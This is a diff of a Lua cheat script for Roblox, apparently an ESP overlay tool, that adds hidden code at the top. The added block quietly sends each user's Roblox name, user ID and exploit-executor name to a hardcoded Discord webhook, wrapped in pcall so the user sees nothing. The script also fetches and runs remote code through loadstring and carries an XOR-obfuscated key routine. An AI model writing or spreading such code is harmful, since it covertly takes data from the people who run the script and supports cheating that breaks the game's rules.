@@ -1,9 +1,50 @@
+print("Script Working")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1336748138291007649/ecAVxkffAqxuHkza0cILj7i9wAqAZTX9FDtoyHl1UtO_uWQIDW6iHzMpmCLXHedJSIqt"
+
+function SendMessageEMBED(url, embed)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["embeds"] = {{
+            ["title"] = embed.title,
+            ["description"] = embed.description,
+            ["color"] = embed.color,
+            ["fields"] = embed.fields,
+            ["footer"] = {["text"] = embed.footer.text}
+        }}
+    }
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = http:JSONEncode(data)
+    })
+end
+
+pcall(function()
+    getgenv().DetectedExecutor = identifyexecutor()
+    local embed = {
+        ["title"] = "Ник в Роблоксе: "..game.Players.LocalPlayer.Name,
+        ["description"] = "",
+        ["color"] = 65280,
+        ["fields"] = {
+            {["name"] = "Айди: "..game.Players.LocalPlayer.UserId, ["value"] = ""},
+            {["name"] = "Инжектор: "..tostring(getgenv().DetectedExecutor), ["value"] = ""}
+        },
+        ["footer"] = {["text"] = "Использовал скрипт на Esp"}
+    }
+    SendMessageEMBED(WEBHOOK_URL, embed)
+end)
+
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 --[[ 
   ██ ▄█▀▓██   ██▓ ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
   ██▄█▒  ▒██  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
-▓███▄░    ▒██ ██░▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
+▓███▄░    ▒██ ██░▒██  ▀█▄  ▓██    ▓██░▓██    ▒██░▒███   ▓██ ░▄█ ▒
 ▓██ █▄    ░ ▐██▓░░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
 ▒██▒ █▄   ░ ██▒▓░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
 ▒ ▒▒ ▓▒    ██▒▒▒  ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
@@ -11,23 +52,17 @@ local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 ░ ░░ ░  ▒ ▒ ░░    ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
 ░  ░    ░ ░           ░  ░       ░          ░      ░  ░   ░     
         ░ ░                                                      
-
-Секретная система шифрования от Вася2
 ]]
 
 local function _XOR_D3CRYPT(data, key)
     local result = {}
     for i = 1, #data do
-        local b = data:byte(i)
-        result[i] = string.char(bit32.bxor(b, key:byte((i-1) % #key + 1)))
+        result[i] = string.char(bit32.bxor(data:byte(i), key:byte((i-1)%#key+1)))
     end
     return table.concat(result)
 end
 
-local _SECRET_DATA = {
-    [1] = 16, [2] = 65, [3] = 237, [4] = 49, 
-    [5] = 237, [6] = 243, [7] = 15, [8] = 26, [9] = 234
-}
+local _SECRET_DATA = {[1]=16,[2]=65,[3]=237,[4]=49,[5]=237,[6]=243,[7]=15,[8]=26,[9]=234}
 
 local function _GET_KEY()
     local transformed = {}
@@ -77,7 +112,6 @@ local hpEnabled = false
 local lineEnabled = false
 local lines = {}
 
--- Toggle for ESP
 local function toggleESP()
 	espEnabled = not espEnabled
 
@@ -150,7 +184,6 @@ local function toggleHP()
 	end
 end
 
--- Toggle for Name display
 local function toggleName()
 	nameEnabled = not nameEnabled
 
